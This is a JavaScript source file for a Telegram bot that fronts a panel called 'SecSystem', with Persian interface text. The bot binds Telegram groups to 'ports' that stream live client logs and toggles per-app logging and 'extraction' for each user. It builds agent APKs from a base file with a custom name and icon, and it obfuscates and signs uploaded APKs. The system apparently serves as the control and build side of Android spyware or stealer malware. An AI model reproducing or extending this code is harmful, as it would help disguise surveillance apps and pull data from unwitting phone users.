/**
 * Local dev: long-polling via getUpdates (no HTTPS webhook).
 * Usage: npm run bot:poll
 */
import { existsSync, statSync } from 'node:fs';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

import { botTokenFromEnv, loadEnvFiles, miniAppUrlFromEnv, telegramApi } from './telegram-env.mjs';
import { manageKeyboard, userSpecsHtml } from '../src/server/telegram/user-set-reply.mjs';
import { processApk } from './apk-sign-pipeline.mjs';

loadEnvFiles();

const token = botTokenFromEnv();
const miniAppUrl = miniAppUrlFromEnv();

if (!token) {
  console.error('TELEGRAM_BOT_TOKEN is missing.');
  process.exit(1);
}

function escapeHtml(value) {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function startWelcomeHtml(firstName) {
  const name = escapeHtml((firstName || 'اپراتور').trim() || 'اپراتور');
  return [
    `سلام <b>${name}</b>`,
    '',
    'پنل <b>SecSystem</b> — مدیریت دستگاه‌های Agent (Mini App).',
    '',
    'دکمهٔ زیر را بزن تا پنل باز شود. فقط شناسه‌های مجاز در ENV دسترسی دارند.',
  ].join('\n');
}

function isStartCommand(text) {
  if (!text) return false;
  return /^\/start(?:@[\w_]+)?(?:\s|$)/i.test(text.trim());
}

function realtimeBase() {
  return (process.env.REALTIME_API_URL || 'http://127.0.0.1:8080').replace(/\/+$/, '');
}

function realtimeHeaders() {
  const token = (process.env.REALTIME_ADMIN_TOKEN || '').trim();
  const headers = { 'Content-Type': 'application/json' };
  if (token) headers.Authorization = `Bearer ${token}`;
  return headers;
}

function adminIds() {
  const ids = new Set();
  for (const part of (process.env.ADMIN_TELEGRAM_ID || '').split(',')) {
    const n = Number(part.trim());
    if (Number.isFinite(n) && n > 0) ids.add(n);
  }
  return ids;
}

async function handleGroupPort(message) {
  const type = message.chat?.type;
  if (type !== 'group' && type !== 'supergroup') return false;
  const text = (message.text || '').trim();
  const chatId = message.chat?.id;
  if (!chatId) return false;
  const portMatch = text.match(/^\/port(?:@[\w_]+)?(?:\s+([A-Za-z0-9]{20}))?\s*$/i);
  const unport = /^\/unport(?:@[\w_]+)?\s*$/i.test(text);
  if (!portMatch && !unport) return false;
  const allowed = adminIds();
  const fromId = message.from?.id;
  if (allowed.size > 0 && !allowed.has(fromId)) return true;
  if (unport) {
    await fetch(`${realtimeBase()}/v1/ports/unbind-group`, {
      method: 'POST',
      headers: realtimeHeaders(),
      body: JSON.stringify({ groupId: chatId }),
    });
    return true;
  }
  const code = portMatch?.[1] || '';
  if (!code) return true;
  const res = await fetch(`${realtimeBase()}/v1/ports/${code}/bind`, {
    method: 'POST',
    headers: realtimeHeaders(),
    body: JSON.stringify({ groupId: chatId, groupTitle: message.chat?.title || '' }),
  });
  if (!res.ok) return true;
  const port = await res.json().catch(() => ({}));
  await announcePortInGroup(token, {
    code: port.code || code,
    name: port.name,
    description: port.description,
    groupId: port.groupId || chatId,
  });
  return true;
}

async function sendStartWelcome(chatId, firstName) {
  const body = {
    chat_id: chatId,
    text: startWelcomeHtml(firstName),
    parse_mode: 'HTML',
    link_preview_options: { is_disabled: true },
  };
  if (miniAppUrl.startsWith('https://')) {
    body.reply_markup = {
      inline_keyboard: [[{ text: 'پنل کفتار', web_app: { url: miniAppUrl } }]],
    };
  }
  await telegramApi(token, 'sendMessage', body);
}

async function configureBot() {
  await telegramApi(token, 'deleteWebhook', { drop_pending_updates: true });
  await telegramApi(token, 'setMyCommands', { commands: [] });
  if (miniAppUrl.startsWith('https://')) {
    await telegramApi(token, 'setChatMenuButton', {
      menu_button: {
        type: 'web_app',
        text: 'پنل کفتار',
        web_app: { url: miniAppUrl },
      },
    });
    console.log('Mini App URL:', miniAppUrl);
  } else {
    console.warn('TELEGRAM_MINI_APP_URL is empty or not https — /start works but no Web App button until ngrok URL is set.');
  }
}

let cachedBot = null;

async function botProfile() {
  if (cachedBot?.id) return cachedBot;
  const me = await telegramApi(token, 'getMe', {});
  cachedBot = { id: me?.id || 0, username: (me?.username || '').replace(/^@/, '') };
  return cachedBot;
}

async function botUserId() {
  const profile = await botProfile();
  return profile.id;
}

function candidateChatIds(chatId) {
  const ids = [chatId];
  if (chatId > 0) {
    const supergroup = Number(`-100${chatId}`);
    if (Number.isSafeInteger(supergroup)) ids.push(supergroup);
    ids.push(-chatId);
  }
  return [...new Set(ids)];
}

async function isBotGroupAdmin(chatId) {
  const botId = await botUserId();
  if (!botId) return false;
  for (const id of candidateChatIds(chatId)) {
    try {
      const member = await telegramApi(token, 'getChatMember', { chat_id: id, user_id: botId });
      const status = member?.status || '';
      if (status === 'administrator' || status === 'creator') return true;
      if (status) return false;
    } catch {
      // try the next id shape
    }
    try {
      const admins = await telegramApi(token, 'getChatAdministrators', { chat_id: id });
      if (
        Array.isArray(admins) &&
        admins.some((row) => row.user?.id === botId && (row.status === 'administrator' || row.status === 'creator'))
      ) {
        return true;
      }
    } catch {
      // chat id is not usable
    }
  }
  return false;
}

function sniffImageMime(bytes) {
  if (bytes.length >= 3 && bytes[0] === 0xff && bytes[1] === 0xd8 && bytes[2] === 0xff) return 'image/jpeg';
  if (bytes.length >= 8 && bytes[0] === 0x89 && bytes[1] === 0x50 && bytes[2] === 0x4e && bytes[3] === 0x47) return 'image/png';
  if (bytes.length >= 12 && bytes.toString('ascii', 0, 4) === 'RIFF' && bytes.toString('ascii', 8, 12) === 'WEBP') return 'image/webp';
  return '';
}

function largestPhotoId(photo) {
  let best = '';
  let area = -1;
  for (const item of photo || []) {
    const id = (item.file_id || '').trim();
    if (!id || /[\s/?#]/.test(id) || id.length > 512) continue;
    const next = (item.width || 0) * (item.height || 0);
    if (next >= area) {
      area = next;
      best = id;
    }
  }
  return best;
}

async function loadPhotoPayload(fileId) {
  if (!fileId) return null;
  try {
    const meta = await telegramApi(token, 'getFile', { file_id: fileId });
    if (!meta?.file_path) return null;
    const file = await fetch(`https://api.telegram.org/file/bot${token}/${meta.file_path}`);
    if (!file.ok) return null;
    const bytes = Buffer.from(await file.arrayBuffer());
    if (!bytes.length || bytes.length > 512 * 1024) return null;
    const sniffed = sniffImageMime(bytes);
    const header = (file.headers.get('content-type') || '').split(';')[0].trim().toLowerCase();
    const mime = sniffed || (header === 'image/jpg' ? 'image/jpeg' : header);
    if (mime !== 'image/jpeg' && mime !== 'image/png' && mime !== 'image/webp') return null;
    return { data: bytes.toString('base64'), mime };
  } catch {
    return null;
  }
}

async function handleChatShared(message) {
  const shared = message.chat_shared;
  if (!shared?.request_id || !shared.chat_id) return false;
  const allowed = adminIds();
  const fromId = message.from?.id;
  if (allowed.size > 0 && !allowed.has(fromId)) return true;
  let title = (shared.title || '').trim();
  if (!title) {
    try {
      const chat = await telegramApi(token, 'getChat', { chat_id: shared.chat_id });
      title = chat?.title || '';
    } catch {
      title = '';
    }
  }
  const username = (shared.username || '').replace(/^@/, '').trim();
  const groupLink = /^[A-Za-z0-9_]{4,}$/.test(username) ? `https://t.me/${username}` : '';
  const botAdminOk = await isBotGroupAdmin(shared.chat_id);
  const photo = botAdminOk ? await loadPhotoPayload(largestPhotoId(shared.photo)) : null;
  const payload = {
    requestId: Number(shared.request_id),
    groupId: Number(shared.chat_id),
    groupTitle: title,
    groupLink,
    botAdminOk,
    groupPhotoData: photo?.data || '',
    groupPhotoMime: photo?.mime || '',
  };
  let res = await fetch(`${realtimeBase()}/v1/ports/bind-shared`, {
    method: 'POST',
    headers: realtimeHeaders(),
    body: JSON.stringify(payload),
  });
  if (!res.ok && payload.groupPhotoData) {
    res = await fetch(`${realtimeBase()}/v1/ports/bind-shared`, {
      method: 'POST',
      headers: realtimeHeaders(),
      body: JSON.stringify({ ...payload, groupPhotoData: '', groupPhotoMime: '' }),
    });
  }
  const raw = await res.text();
  if (!res.ok) {
    console.error('bind-shared failed', res.status, raw.slice(0, 180));
  }
  let data = {};
  try {
    data = raw ? JSON.parse(raw) : {};
  } catch {
    data = {};
  }
  if (res.ok && data.code && !data.pending) {
    await announcePortInGroup(token, {
      code: data.code,
      name: data.name,
      description: data.description,
      groupId: data.groupId || shared.chat_id,
    });
  }
  return true;
}

function escapeMarkdownV2(value) {
  return String(value || '').replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
}

function portAssignedMarkdown(port) {
  const name = escapeMarkdownV2((port.name || '').trim() || 'بدون اسم');
  const description = (port.description || '').trim();
  const code = String(port.code || '').trim().replace(/[\\`]/g, '\\$&');
  const lines = [
    '🟢 *پورت SecSystem روشن شد*',
    '',
    'از این لحظه لاگ کلاینت‌های همین پورت، زنده، داخل این گروه می‌آید\\.',
    '',
    '🏷 *اسم*',
    name,
  ];
  if (description) lines.push('', '📝 *توضیحات*', escapeMarkdownV2(description));
  if (code) lines.push('', '🔑 *کد پورت*', '`' + code + '`');
  lines.push('', '👇 کد را کپی کن، یا پنل را باز کن\\.');
  return lines.join('\n');
}

async function announcePortInGroup(botToken, port) {
  const groupId = Number(port.groupId || 0);
  const code = String(port.code || '').trim();
  if (!groupId || !code) return;
  const profile = await botProfile();
  const url = profile.username ? `https://t.me/${profile.username}?startapp` : miniAppUrl;
  const row = [{ text: '📋 کپی کد', copy_text: { text: code } }];
  if (url.startsWith('https://')) row.push({ text: '🎛 باز کردن پنل', url });
  try {
    await telegramApi(botToken, 'sendMessage', {
      chat_id: groupId,
      text: portAssignedMarkdown(port),
      parse_mode: 'MarkdownV2',
      link_preview_options: { is_disabled: true },
      reply_markup: { inline_keyboard: [row] },
    });
  } catch (error) {
    console.error('group announce failed', error instanceof Error ? error.message : error);
  }
}

const SET_RE = /^\/set_([0-9a-fA-F]{16})(?:@[\w_]+)?\s*$/;

async function handleGroupSet(message) {
  const type = message.chat?.type;
  if (type !== 'group' && type !== 'supergroup') return false;
  const match = (message.text || '').trim().match(SET_RE);
  if (!match) return false;
  const chatId = message.chat?.id;
  if (!chatId) return true;
  const allowed = adminIds();
  if (allowed.size > 0 && !allowed.has(message.from?.id)) return true;
  const setToken = match[1].toLowerCase();
  try {
    const portsRes = await fetch(`${realtimeBase()}/v1/ports`, { headers: realtimeHeaders() });
    if (!portsRes.ok) return true;
    const ports = await portsRes.json();
    const port = (ports.items || []).find((item) => Number(item.groupId) === Number(chatId));
    if (!port?.code) return true;
    const userRes = await fetch(`${realtimeBase()}/v1/users/set/${setToken}`, { headers: realtimeHeaders() });
    if (!userRes.ok) return true;
    const card = await userRes.json();
    const portLabel = [port.name, port.code].map((part) => String(part || '').trim()).filter(Boolean).join(' · ');
    const devices = (card.devices || [])
      .filter((device) => device.port === port.code)
      .map((device) => ({ ...device, portName: portLabel || device.port }));
    if (!devices.length) return true;
    const profile = await botProfile();
    const payload = {
      chat_id: chatId,
      text: userSpecsHtml({ ...card, setToken, devices }),
      parse_mode: 'HTML',
      link_preview_options: { is_disabled: true },
      reply_markup: manageKeyboard(profile.username, setToken),
    };
    if (message.message_id) {
      payload.reply_to_message_id = message.message_id;
      payload.allow_sending_without_reply = true;
    }
    await telegramApi(token, 'sendMessage', payload);
  } catch (error) {
    console.error('set reply failed', error instanceof Error ? error.message : error);
  }
  return true;
}

function parseWatchCallback(data) {
  const parts = String(data || '').split(':');
  if (parts.length < 2) return null;
  const kind = parts[0];
  const setToken = (parts[1] || '').toLowerCase();
  if (!/^[0-9a-f]{16}$/.test(setToken)) return null;
  const packageRef = parts.slice(2).join(':');
  switch (kind) {
    case 'wl':
      return packageRef ? { action: 'skip_log', setToken, packageRef } : null;
    case 'we':
      return packageRef ? { action: 'skip_extract', setToken, packageRef } : null;
    case 'wb':
      return { action: 'block', setToken, packageRef: packageRef || undefined };
    case 'wm':
      return { action: 'mute', setToken, packageRef: packageRef || undefined };
    default:
      return null;
  }
}

function toastFor(action, state) {
  switch (action) {
    case 'mute':
      return state.muted ? 'بی‌صدا شد' : 'صدا دار شد';
    case 'block':
      return state.blocked ? 'بلاک شد' : 'رفع بلاک';
    case 'skip_log':
      return state.skipLog ? 'لاگ اپ معاف شد' : 'لاگ اپ فعال شد';
    case 'skip_extract':
      return state.skipExtract ? 'استخراج معاف شد' : 'استخراج فعال شد';
    default:
      return 'اعمال شد';
  }
}

function pickUrls(markup) {
  let sessionUrl;
  let manageUrl;
  for (const row of markup?.inline_keyboard || []) {
    for (const btn of row) {
      const url = (btn.url || '').trim();
      if (!url) continue;
      if (url.includes('startapp=ws_')) sessionUrl = url;
      else if (url.includes('startapp=u_')) manageUrl = url;
    }
  }
  return { sessionUrl, manageUrl };
}

function appLabelFromMarkup(markup) {
  for (const row of markup?.inline_keyboard || []) {
    for (const btn of row) {
      const text = (btn.text || '').trim();
      const marked = text.match(/📱\s*(.+?)\s*📱/);
      if (marked?.[1]) return marked[1].trim();
      const legacy = text.match(/(?:معاف لاگ|فعال لاگ|معاف استخراج|فعال استخراج)(?: این)? (.+) برای کاربر$/);
      if (legacy?.[1]) return legacy[1].replace(/^📱\s*|\s*📱$/g, '').trim();
    }
  }
  return '';
}

function appLabelFromText(text) {
  const line = String(text || '')
    .split('\n')
    .map((part) => part.trim())
    .find((part) => part.startsWith('برنامه'));
  if (!line) return '';
  return line.replace(/^برنامه\s*:?\s*/u, '').trim();
}

function watchAppButton(prefix, app, suffix) {
  let name = String(app || '').trim() || 'برنامه';
  const join = (value) => `${prefix} 📱 ${value} 📱 ${suffix}`.trim();
  let label = join(name);
  if ([...label].length <= 64) return label;
  const overhead = [...prefix].length + [...suffix].length + [...' 📱  📱 '].length;
  const keep = Math.max(4, 64 - overhead);
  const runes = [...name];
  if (runes.length > keep) name = `${runes.slice(0, keep - 1).join('')}…`;
  label = join(name);
  return [...label].length <= 64 ? label : [...label].slice(0, 64).join('');
}

function buildWatchKeyboard(setToken, packageRef, appLabel, urls, state) {
  const rows = [];
  const top = [];
  if (urls.sessionUrl) top.push({ text: '📂 نشست', url: urls.sessionUrl });
  if (urls.manageUrl) top.push({ text: '👤 مدیریت کاربر', url: urls.manageUrl });
  if (top.length) rows.push(top);
  if (packageRef) {
    rows.push([
      {
        text: state.skipLog
          ? watchAppButton('✅ فعال لاگ', appLabel, 'برای کاربر')
          : watchAppButton('📋 معاف لاگ', appLabel, 'برای کاربر'),
        callback_data: `wl:${setToken}:${packageRef}`,
      },
    ]);
    rows.push([
      {
        text: state.skipExtract
          ? watchAppButton('✅ فعال استخراج', appLabel, 'برای کاربر')
          : watchAppButton('🤖 معاف استخراج', appLabel, 'برای کاربر'),
        callback_data: `we:${setToken}:${packageRef}`,
      },
    ]);
  }
  const blockData = packageRef ? `wb:${setToken}:${packageRef}` : `wb:${setToken}`;
  const muteData = packageRef ? `wm:${setToken}:${packageRef}` : `wm:${setToken}`;
  rows.push([{ text: state.blocked ? '✅ رفع بلاک کاربر' : '🚫 بلاک کاربر', callback_data: blockData }]);
  rows.push([
    { text: state.muted ? '🔊 صدا دار کردن کاربر' : '🔇 بی‌صدا کردن کاربر', callback_data: muteData },
  ]);
  return { inline_keyboard: rows };
}

async function answerCallback(id, text) {
  await telegramApi(token, 'answerCallbackQuery', {
    callback_query_id: id,
    text,
    show_alert: false,
  });
}

async function handleWatchCallback(cq) {
  const data = (cq.data || '').trim();
  if (!data.startsWith('w')) return false;
  const allowed = adminIds();
  const fromId = cq.from?.id;
  if (allowed.size > 0 && !allowed.has(fromId)) {
    await answerCallback(cq.id, 'اجازه ندارید');
    return true;
  }
  const parsed = parseWatchCallback(data);
  if (!parsed) return false;
  try {
    const res = await fetch(`${realtimeBase()}/v1/watch/action`, {
      method: 'POST',
      headers: realtimeHeaders(),
      body: JSON.stringify({
        action: parsed.action,
        setToken: parsed.setToken,
        packageRef: parsed.packageRef || undefined,
      }),
    });
    if (!res.ok) {
      const text = await res.text().catch(() => '');
      console.error('watch action failed', res.status, text.slice(0, 180));
      await answerCallback(cq.id, text.includes('package') ? 'پکیج پیدا نشد' : 'خطا در اعمال');
      return true;
    }
    const body = await res.json().catch(() => ({}));
    const state = {
      muted: Boolean(body.watchMuted),
      blocked: Boolean(body.blocked),
      skipLog: Boolean(body.skipLog),
      skipExtract: Boolean(body.skipExtract),
    };
    let packageRef = parsed.packageRef || body.packageRef || '';
    if (!packageRef) {
      for (const row of cq.message?.reply_markup?.inline_keyboard || []) {
        for (const btn of row) {
          const cb = (btn.callback_data || '').trim();
          if (cb.startsWith('wl:') || cb.startsWith('we:')) {
            packageRef = cb.split(':').slice(2).join(':');
            break;
          }
        }
        if (packageRef) break;
      }
    }
    const appLabel =
      String(body.appLabel || '').trim() ||
      appLabelFromMarkup(cq.message?.reply_markup) ||
      appLabelFromText(cq.message?.text) ||
      'برنامه';
    const chatId = cq.message?.chat?.id;
    const messageId = cq.message?.message_id;
    if (chatId && messageId) {
      const keyboard = buildWatchKeyboard(
        parsed.setToken,
        packageRef,
        appLabel,
        pickUrls(cq.message?.reply_markup),
        state,
      );
      await telegramApi(token, 'editMessageReplyMarkup', {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: keyboard,
      });
    }
    await answerCallback(cq.id, toastFor(parsed.action, state));
  } catch (error) {
    console.error('watch callback failed', error instanceof Error ? error.message : error);
    await answerCallback(cq.id, 'سرور در دسترس نیست');
  }
  return true;
}

function manageDisplayName(u) {
  if (!u) return 'کاربر';
  if (u.username) return `@${u.username}`;
  return u.first_name || String(u.id || '');
}

function manageEscape(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function manageStatusHtml(who, portLabel, isManager) {
  const state = isManager ? 'هم‌اکنون <b>مدیر پنل</b> این پورت است.' : 'مدیر پنل این پورت <b>نیست</b>.';
  return `مدیریت دسترسی پنل برای ${who}\nپورت: <b>${manageEscape(portLabel)}</b>\n${state}`;
}

function portManagerKeyboard(targetId) {
  return {
    inline_keyboard: [
      [
        { text: 'مدیر کردن', callback_data: `pm:a:${targetId}`, style: 'success' },
        { text: 'عزل از مدیریت', callback_data: `pm:r:${targetId}`, style: 'danger' },
      ],
    ],
  };
}

function baseApkReady() {
  const here = fileURLToPath(new URL('.', import.meta.url));
  const cwd = process.cwd();
  const candidates = [
    process.env.APK_SIGNER_DIR,
    resolve(here, '..', '..', 'tools', 'apksigner'),
    resolve(here, '..', '..', 'tools', 'apk-signer'),
    resolve(here, '..', 'tools', 'apksigner'),
    resolve(here, '..', 'tools', 'apk-signer'),
    resolve(cwd, '..', 'tools', 'apksigner'),
    resolve(cwd, '..', 'tools', 'apk-signer'),
    resolve(cwd, 'tools', 'apksigner'),
    resolve(cwd, 'tools', 'apk-signer'),
  ].filter(Boolean);
  for (const root of candidates) {
    const apk = join(root, 'base', 'agent.apk');
    try {
      if (existsSync(apk) && statSync(apk).size > 1000) return true;
    } catch {
      /* ignore */
    }
  }
  return false;
}

async function handleGroupFile(message) {
  const type = message.chat?.type;
  if (type !== 'group' && type !== 'supergroup') return false;
  const text = (message.text || '').trim();
  if (!/^(?:\/(?:file|apk)(?:@[\w_]+)?|فایل|file)\s*$/i.test(text)) return false;
  const chatId = message.chat?.id;
  if (!chatId) return false;
  const fromId = message.from?.id || 0;
  const allowed = adminIds();
  const res = await fetch(
    `${realtimeBase()}/v1/ports/managers?groupId=${encodeURIComponent(String(chatId))}&telegramId=${encodeURIComponent(String(fromId))}`,
    { headers: realtimeHeaders() },
  );
  if (!res.ok) {
    await telegramApi(token, 'sendMessage', {
      chat_id: chatId,
      text: 'این گروه به پورتی وصل نیست.',
      reply_to_message_id: message.message_id,
      allow_sending_without_reply: true,
    });
    return true;
  }
  const state = await res.json().catch(() => ({}));
  const isOwner = allowed.size === 0 || allowed.has(fromId);
  const isManager = Boolean(state.isManager);
  if (!isOwner && !isManager) {
    await telegramApi(token, 'sendMessage', {
      chat_id: chatId,
      text: 'فقط اونر یا مدیر این پورت می‌تواند فایل بسازد.',
      reply_to_message_id: message.message_id,
      allow_sending_without_reply: true,
    });
    return true;
  }
  if (!state.code) {
    await telegramApi(token, 'sendMessage', {
      chat_id: chatId,
      text: 'این گروه به پورتی وصل نیست.',
      reply_to_message_id: message.message_id,
      allow_sending_without_reply: true,
    });
    return true;
  }
  if (!baseApkReady()) {
    await telegramApi(token, 'sendMessage', {
      chat_id: chatId,
      text: 'APK پایه هنوز در تنظیمات پنل آپلود نشده.',
      reply_to_message_id: message.message_id,
      allow_sending_without_reply: true,
    });
    return true;
  }
  const profile = await botProfile();
  const start = `apk_${state.code}`;
  const url = profile.username
    ? `https://t.me/${profile.username}?startapp=${start}`
    : `${miniAppUrl}?tgWebAppStartParam=${start}`;
  const portLabel = state.name || state.code;
  await telegramApi(token, 'sendMessage', {
    chat_id: chatId,
    text: `ساخت فایل برای پورت <b>${escapeHtml(portLabel)}</b>\nاسم و آیکن را انتخاب کن، بعد بساز.`,
    parse_mode: 'HTML',
    reply_to_message_id: message.message_id,
    allow_sending_without_reply: true,
    reply_markup: {
      inline_keyboard: [[{ text: 'ساخت فایل', url, style: 'success' }]],
    },
  });
  return true;
}

async function handleGroupManage(message) {
  const type = message.chat?.type;
  if (type !== 'group' && type !== 'supergroup') return false;
  const text = (message.text || '').trim();
  if (!/^(?:\/(?:admin|modiriat)(?:@[\w_]+)?|admin|مدیریت)\s*$/i.test(text)) return false;
  const chatId = message.chat?.id;
  if (!chatId) return false;
  const allowed = adminIds();
  const fromId = message.from?.id || 0;
  if (allowed.size > 0 && !allowed.has(fromId)) return true;
  const target = message.reply_to_message?.from;
  const targetId = target?.id || 0;
  if (!targetId || target.is_bot) {
    await telegramApi(token, 'sendMessage', {
      chat_id: chatId,
      text: 'روی پیام همان نفر ریپلای کن و بنویس مدیریت.',
      reply_to_message_id: message.message_id,
      allow_sending_without_reply: true,
    });
    return true;
  }
  const res = await fetch(
    `${realtimeBase()}/v1/ports/managers?groupId=${encodeURIComponent(String(chatId))}&telegramId=${encodeURIComponent(String(targetId))}`,
    { headers: realtimeHeaders() },
  );
  if (!res.ok) {
    await telegramApi(token, 'sendMessage', {
      chat_id: chatId,
      text: 'این گروه به پورتی وصل نیست.',
      reply_to_message_id: message.message_id,
      allow_sending_without_reply: true,
    });
    return true;
  }
  const state = await res.json().catch(() => ({}));
  const who = manageDisplayName(target);
  const portLabel = state.name || state.code || 'پورت';
  await telegramApi(token, 'sendMessage', {
    chat_id: chatId,
    text: manageStatusHtml(who, portLabel, Boolean(state.isManager)),
    parse_mode: 'HTML',
    reply_to_message_id: message.message_id,
    allow_sending_without_reply: true,
    reply_markup: portManagerKeyboard(targetId),
  });
  return true;
}

async function handleManageCallback(cq) {
  const data = (cq.data || '').trim();
  if (!data.startsWith('pm:')) return false;
  const allowed = adminIds();
  const fromId = cq.from?.id || 0;
  if (allowed.size > 0 && !allowed.has(fromId)) {
    await answerCallback(cq.id, 'اجازه ندارید');
    return true;
  }
  const parts = data.split(':');
  if (parts.length !== 3 || (parts[1] !== 'a' && parts[1] !== 'r')) {
    await answerCallback(cq.id, 'داده نامعتبر');
    return true;
  }
  const action = parts[1] === 'a' ? 'add' : 'remove';
  const targetId = Number(parts[2]);
  const chatId = cq.message?.chat?.id;
  const messageId = cq.message?.message_id;
  if (!Number.isFinite(targetId) || targetId <= 0 || !chatId || !messageId) {
    await answerCallback(cq.id, 'خطا');
    return true;
  }
  const res = await fetch(`${realtimeBase()}/v1/ports/managers`, {
    method: 'POST',
    headers: realtimeHeaders(),
    body: JSON.stringify({ groupId: chatId, telegramId: targetId, action }),
  });
  if (res.status === 404) {
    await answerCallback(cq.id, 'پورت پیدا نشد');
    return true;
  }
  if (!res.ok) {
    await answerCallback(cq.id, 'اعمال نشد');
    return true;
  }
  const body = await res.json().catch(() => ({}));
  const whoMatch = (cq.message?.text || '').match(/برای\s+(@?\S+)/);
  const who = whoMatch?.[1] || String(targetId);
  const portLabel = body.name || body.code || 'پورت';
  await telegramApi(token, 'editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: manageStatusHtml(who, portLabel, Boolean(body.isManager)),
    parse_mode: 'HTML',
    reply_markup: portManagerKeyboard(targetId),
  });
  await answerCallback(cq.id, action === 'add' ? 'مدیر شد' : 'عزل شد');
  return true;
}

async function downloadTelegramFileTo(fileId, destPath) {
  const meta = await telegramApi(token, 'getFile', { file_id: fileId });
  const filePath = meta?.file_path;
  if (!filePath) throw new Error('getFile failed');
  const res = await fetch(`https://api.telegram.org/file/bot${token}/${filePath}`);
  if (!res.ok) throw new Error(`download http ${res.status}`);
  const buf = Buffer.from(await res.arrayBuffer());
  await writeFile(destPath, buf);
}

async function sendDocumentFile(chatId, filePath, fileName) {
  const bytes = await import('node:fs/promises').then((fs) => fs.readFile(filePath));
  const form = new FormData();
  form.append('chat_id', String(chatId));
  form.append('document', new Blob([bytes]), fileName);
  const res = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
    method: 'POST',
    body: form,
  });
  const data = await res.json();
  if (!data.ok) throw new Error(data.description || 'sendDocument failed');
}

async function handleApkDocument(message) {
  const doc = message.document;
  if (!doc) return false;
  if (message.chat?.type !== 'private') return false;
  const chatId = message.chat?.id;
  const fromId = message.from?.id;
  if (!chatId) return true;
  const allowed = adminIds();
  if (allowed.size > 0 && !allowed.has(fromId)) {
    await telegramApi(token, 'sendMessage', { chat_id: chatId, text: 'فقط ادمین می‌تواند APK ارسال کند.' });
    return true;
  }
  const name = (doc.file_name || '').toLowerCase();
  if (!name.endsWith('.apk') && doc.mime_type !== 'application/vnd.android.package-archive') {
    await telegramApi(token, 'sendMessage', { chat_id: chatId, text: 'فقط فایل APK ارسال کنید.' });
    return true;
  }
  if ((doc.file_size || 0) > 49 * 1024 * 1024) {
    await telegramApi(token, 'sendMessage', {
      chat_id: chatId,
      text: 'حجم APK بیش از حد مجاز تلگرام برای ربات است (حداکثر حدود ۵۰ مگابایت).',
    });
    return true;
  }

  await telegramApi(token, 'sendMessage', { chat_id: chatId, text: 'در حال کدگذاری و امضای APK…' });

  const tmpDir = await mkdtemp(join(tmpdir(), 'panel-apk-'));
  const inPath = join(tmpDir, 'input.apk');
  let taskCleanup = null;
  try {
    await downloadTelegramFileTo(doc.file_id, inPath);
    const result = await processApk(inPath);
    taskCleanup = result.cleanup;
    await sendDocumentFile(chatId, result.path, result.fileName);
  } catch (err) {
    console.error('apk sign failed', err);
    const msg = err instanceof Error ? err.message : String(err);
    await telegramApi(token, 'sendMessage', {
      chat_id: chatId,
      text: `خطا در پردازش: ${msg.slice(0, 180)}`,
    });
  } finally {
    try {
      taskCleanup?.();
    } catch {
      /* ignore */
    }
    await rm(tmpDir, { recursive: true, force: true }).catch(() => {});
  }
  return true;
}

async function handleUpdate(update) {
  if (update.callback_query) {
    if (await handleManageCallback(update.callback_query)) return;
    await handleWatchCallback(update.callback_query);
    return;
  }
  const message = update.message;
  if (!message) return;
  if (await handleChatShared(message)) return;
  if (await handleGroupSet(message)) return;
  if (await handleGroupManage(message)) return;
  if (await handleGroupFile(message)) return;
  if (await handleGroupPort(message)) return;
  if (await handleApkDocument(message)) return;
  if (message.chat?.type !== 'private' || !isStartCommand(message.text)) {
    return;
  }
  const chatId = message.chat?.id;
  if (!chatId) return;
  await sendStartWelcome(chatId, message.from?.first_name);
}

async function pollLoop() {
  let offset = 0;
  console.log('Polling getUpdates… (Ctrl+C to stop)');
  for (;;) {
    const updates = await telegramApi(token, 'getUpdates', {
      offset,
      timeout: 50,
      allowed_updates: ['message', 'callback_query'],
    });
    for (const update of updates) {
      offset = update.update_id + 1;
      try {
        await handleUpdate(update);
      } catch (error) {
        console.error('Update failed:', update.update_id, error);
      }
    }
  }
}

await configureBot();
await pollLoop();
